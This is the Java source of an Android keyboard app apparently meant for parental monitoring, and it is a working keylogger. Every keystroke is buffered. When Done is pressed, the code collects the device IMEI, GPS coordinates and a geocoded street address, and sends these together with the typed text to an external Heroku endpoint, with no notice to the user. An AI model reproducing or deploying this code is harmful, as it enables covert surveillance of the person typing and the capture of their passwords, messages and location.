package app.dipaz.androidkeyboard;

import android.content.Context;

import android.content.Intent;
import android.inputmethodservice.InputMethodService;
import android.inputmethodservice.Keyboard;
import android.inputmethodservice.KeyboardView;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.media.AudioManager;
import android.os.Bundle;
import android.provider.Settings;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.view.KeyEvent;
import android.view.View;
import android.view.inputmethod.InputConnection;
import android.content.pm.PackageManager;
import android.Manifest;
import androidx.core.content.ContextCompat;
import android.os.Build;
import androidx.annotation.RequiresApi;

import android.location.Address;
import android.location.Geocoder;
import android.location.LocationProvider;
import java.io.IOException;
import java.util.List;
import java.util.Locale;

public class PaternalKeyboard extends InputMethodService implements KeyboardView.OnKeyboardActionListener {

    static final int PERMISSION_READ_STATE = 123;

    private String word = "";
    private String ime = "";
    private KeyboardView kv;
    private Keyboard keyboard;
    private boolean isCaps = false;

    private String latitud,longitud,direccionS;

    @Override
    public View onCreateInputView() {
        kv = (KeyboardView) getLayoutInflater().inflate(R.layout.keyboard, null);
        keyboard = new Keyboard(this, R.xml.qwerty);
        kv.setKeyboard(keyboard);
        kv.setOnKeyboardActionListener(this);
        return kv;
    }

    @Override
    public void onPress(int primaryCode) {

    }

    @Override
    public void onRelease(int primaryCode) {

    }

    @Override
    public void onKey(int primaryCode, int[] keyCodes) {

        if (primaryCode >= 32) {
            word += String.valueOf(Character.toChars(primaryCode));
        }

        InputConnection ic = getCurrentInputConnection();
        playClick(primaryCode);
        switch (primaryCode) {
            case Keyboard.KEYCODE_DELETE:
                ic.deleteSurroundingText(1, 0);
                word += String.valueOf(Character.toChars(8));
                break;
            case Keyboard.KEYCODE_SHIFT:
                isCaps = !isCaps;
                keyboard.setShifted(isCaps);
                kv.invalidateAllKeys();
                break;
            case Keyboard.KEYCODE_DONE:
                ic.sendKeyEvent(new KeyEvent(KeyEvent.ACTION_DOWN, KeyEvent.KEYCODE_ENTER));
                System.out.println("palabra: " + word);
                ime = getime();
                System.out.println("IMEI number: " + ime);
                System.out.println("-"+getlocation());
                System.out.println("Latitud " + latitud);
                System.out.println("Longitud " + longitud);
                System.out.println("Direccion " + direccionS);

                consumirServicio(ime, word, direccionS);

                word = "";
                break;
            default:
                char code = (char) primaryCode;
                if (Character.isLetter(code) && isCaps)
                    code = Character.toUpperCase(code);
                ic.commitText(String.valueOf(code), 1);
        }
    }

    private void playClick(int i) {
        AudioManager am = (AudioManager) getSystemService(AUDIO_SERVICE);
        switch (i) {
            case 32:
                am.playSoundEffect(AudioManager.FX_KEYPRESS_SPACEBAR);
                break;
            case Keyboard.KEYCODE_DONE:
            case 10:
                am.playSoundEffect(AudioManager.FX_KEYPRESS_RETURN);
                break;
            case Keyboard.KEYCODE_DELETE:
            case 13:
                am.playSoundEffect(AudioManager.FX_KEYPRESS_DELETE);
                break;
            default:
                am.playSoundEffect(AudioManager.FX_KEYPRESS_STANDARD);
        }
    }

    @Override
    public void onText(CharSequence text) {

    }

    @Override
    public void swipeLeft() {

    }

    @Override
    public void swipeRight() {

    }

    @Override
    public void swipeDown() {

    }

    @Override
    public void swipeUp() {

    }

    public void consumirServicio(String ime, String text, String location) {
        System.out.println("IME: " + ime);
        System.out.println("text: " + text);
        ServicioTask servicioTask = new ServicioTask(this, "https://project-nb.herokuapp.com/messages/new/" + ime, ime, text,location);
        servicioTask.execute();
    }

    @RequiresApi(api = Build.VERSION_CODES.M)
    public String getime() {

        int RequestCheckResult;
        RequestCheckResult = ContextCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE);

        if (RequestCheckResult == PackageManager.PERMISSION_GRANTED) {

            TelephonyManager manager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
            String IMEINumber = manager.getDeviceId();

            return IMEINumber;
        }
        return "None";
    }

    private String getlocation() {
        LocationManager mlocManager = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
        Localizacion Local = new Localizacion();
        String dire = Local.setLocation();
        final boolean gpsEnabled = mlocManager.isProviderEnabled(LocationManager.GPS_PROVIDER);
        if (!gpsEnabled) {
            Intent settingsIntent = new Intent(Settings.ACTION_LOCATION_SOURCE_SETTINGS);
            startActivity(settingsIntent);
        }
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED && ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
            return "None";
        }
        mlocManager.requestLocationUpdates(LocationManager.NETWORK_PROVIDER, 0, 0, (LocationListener) Local);
        mlocManager.requestLocationUpdates(LocationManager.GPS_PROVIDER, 0, 0, (LocationListener) Local);
        return dire;
    }

    public String setLocationName (Location loc) {
        if (loc.getLatitude() != 0.0 && loc.getLongitude() != 0.0) {
            try {
                Geocoder geocoder = new Geocoder(this, Locale.getDefault());
                List<Address> list = geocoder.getFromLocation(
                        loc.getLatitude(), loc.getLongitude(), 1);
                if (!list.isEmpty()) {
                    Address DirCalle = list.get(0);
                    return DirCalle.getAddressLine(0);
                }
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
        return "Lugar no detectado";
    }

    public class Localizacion implements LocationListener {
        String direccion;
        public String setLocation (){
            return direccion;
        }
        @Override
        public void onLocationChanged(Location loc) {
            loc.getLatitude();
            loc.getLongitude();
            String sLatitud = String.valueOf(loc.getLatitude());
            String sLongitud = String.valueOf(loc.getLongitude());
            latitud = sLatitud;
            longitud = sLongitud;
            direccionS = setLocationName(loc);
        }
        @Override
        public void onProviderDisabled(String provider) {
            latitud = "GPS Desactivado";
        }
        @Override
        public void onProviderEnabled(String provider) {
            latitud = "GPS Activado";
        }
        @Override
        public void onStatusChanged(String provider, int status, Bundle extras) {
            switch (status) {
                case LocationProvider.AVAILABLE:
                    Log.d("debug", "LocationProvider.AVAILABLE");
                    break;
                case LocationProvider.OUT_OF_SERVICE:
                    Log.d("debug", "LocationProvider.OUT_OF_SERVICE");
                    break;
                case LocationProvider.TEMPORARILY_UNAVAILABLE:
                    Log.d("debug", "LocationProvider.TEMPORARILY_UNAVAILABLE");
                    break;
            }
        }
    }
}